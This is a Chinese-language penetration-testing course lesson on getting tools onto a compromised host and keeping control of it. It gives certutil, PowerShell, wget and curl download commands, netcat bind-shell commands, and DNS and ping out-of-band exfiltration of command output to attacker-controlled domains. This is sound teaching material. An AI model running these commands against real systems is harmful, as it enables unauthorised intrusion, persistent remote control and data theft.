上一节我们介绍了课程概述，本节中我们来看看第一个基础技能：文件上传下载。这个技能主要解决在无图形化界面的环境下进行数据传输的问题。在实战中，我们获得的权限往往只是一个命令执行窗口，无法使用浏览器下载文件，因此必须掌握通过命令行下载文件的方法。

![](img/13474747609a13c6db2a7c6d9860033b_59.png)

![](img/13474747609a13c6db2a7c6d9860033b_61.png)

![](img/13474747609a13c6db2a7c6d9860033b_63.png)

其核心原理是：在自己的服务器上放置好工具文件，然后让目标服务器通过命令行访问该文件的URL地址，将文件下载到其本地。

![](img/13474747609a13c6db2a7c6d9860033b_65.png)

![](img/13474747609a13c6db2a7c6d9860033b_67.png)

以下是常见的文件下载命令，分为Windows和Linux系统：

**Windows系统常用命令：**
*   `certutil -urlcache -split -f http://your-server.com/tool.exe C:\tool.exe`
*   `powershell -c "Invoke-WebRequest -Uri http://your-server.com/tool.exe -OutFile C:\tool.exe"`

**Linux系统常用命令：**
*   `wget http://your-server.com/tool -O /tmp/tool`
*   `curl http://your-server.com/tool -o /tmp/tool`

## 二、 反弹Shell与正反向连接 🔄

学会了文件下载，我们就可以将必要的工具（如nc）上传到目标机器。接下来，我们看看如何通过反弹Shell获得一个交互式的、可持续控制的命令行权限。

![](img/13474747609a13c6db2a7c6d9860033b_93.png)

![](img/13474747609a13c6db2a7c6d9860033b_95.png)

![](img/13474747609a13c6db2a7c6d9860033b_97.png)

### 1. 反弹Shell的作用
反弹Shell主要解决两个问题：
1.  **解决交互式命令执行问题**：某些命令（如`useradd`）需要等待用户输入，在Web漏洞中执行会卡住。反弹Shell可以将交互界面“反弹”到攻击者机器上完成。
2.  **维持权限与稳定通信**：通过一次漏洞利用建立反弹连接，后续就可以像操作本地机器一样持续控制目标，无需重复触发漏洞。

### 2. 核心概念：正向连接与反向连接
这是本节课的难点，但理解其网络通信本质后就很简单。我们以Netcat（nc）工具为例进行说明。

![](img/13474747609a13c6db2a7c6d9860033b_111.png)

**核心区别在于“谁主动连接谁”**：
*   **正向连接**：攻击者主动连接到目标监听的端口。
*   **反向连接**：目标主动连接到攻击者监听的端口。

![](img/13474747609a13c6db2a7c6d9860033b_113.png)

![](img/13474747609a13c6db2a7c6d9860033b_115.png)

![](img/13474747609a13c6db2a7c6d9860033b_117.png)

“正向”和“反向”是相对的，取决于以哪一方为参照物。在渗透中，我们通常以**攻击者**为参照：
*   **攻击者主动连接目标** -> **正向连接**
*   **目标主动连接攻击者** -> **反向连接**

![](img/13474747609a13c6db2a7c6d9860033b_119.png)

![](img/13474747609a13c6db2a7c6d9860033b_121.png)

以下是使用nc实现两种连接的典型命令：

![](img/13474747609a13c6db2a7c6d9860033b_123.png)

**正向连接示例（目标监听，攻击者连接）：**
```bash
# 在目标机器上执行：监听端口，将shell绑定到该端口
nc -lvp 5566 -e /bin/bash   # Linux
nc -lvp 5566 -e cmd.exe     # Windows
```

### 3. 应用场景：内网穿透与防火墙绕过

**场景一：目标处于内网（如公司局域网）**
*   **问题**：目标机器没有公网IP，攻击者无法直接访问到它。
*   **解决方案**：必须使用**反向连接**。因为内网机器可以访问外网（攻击者IP），而外网无法直接访问内网机器。让目标主动“出网”连接攻击者。

**场景二：防火墙策略限制**
防火墙通常有**入站规则**（管理进入的流量）和**出站规则**（管理出去的流量）。
*   **如果防火墙严格限制入站流量**（例如阻止了5566端口入站），那么**正向连接**（攻击者连目标）会失败。此时应改用**反向连接**（目标连攻击者），利用出站流量。
*   **如果防火墙严格限制出站流量**，则情况相反。

![](img/13474747609a13c6db2a7c6d9860033b_230.png)

### 1. 什么是带外查询？
当发现一个疑似命令执行点（如一个输入框），但执行命令后页面没有任何输出（无回显）时，我们无法判断命令是否真的被执行。
带外查询的思路是：**让目标机器执行一条能触发网络访问的命令，将执行结果通过这次网络请求带出来**。我们只需要在自己的服务器上查看是否有访问记录，以及记录中是否包含了命令执行的结果。

### 2. 实践演示
常用方法是利用`ping`、`curl`或`nslookup`命令，让目标去访问一个我们控制的域名或服务器。

**简单探测（判断命令是否执行）：**
```
ping -c 1 your-domain.com
```
如果我们的服务器收到来自目标IP的ping请求，说明命令执行漏洞存在。

![](img/13474747609a13c6db2a7c6d9860033b_335.png)

**进阶利用（带回执行结果）：**
在Linux上相对简单，可以利用反引号或`$()`将命令执行结果嵌入到请求中：
```
ping -c 1 `whoami`.your-domain.com
```
最终ping的地址会是`root.your-domain.com`，我们在DNS日志中看到`root`这个子域名，就知道了`whoami`命令的执行结果是`root`。

在Windows上稍复杂，因为`cmd`对字符串处理不如Linux灵活。通常需要借助`PowerShell`来实现变量赋值和拼接：
```powershell
# 思路：将命令结果赋值给变量，然后拼接到域名中进行请求
$x=whoami; $y='.your-domain.com'; $z=$x+$y; ping $z
```
通过构造这样的命令，同样可以将`whoami`的结果通过DNS查询带出。
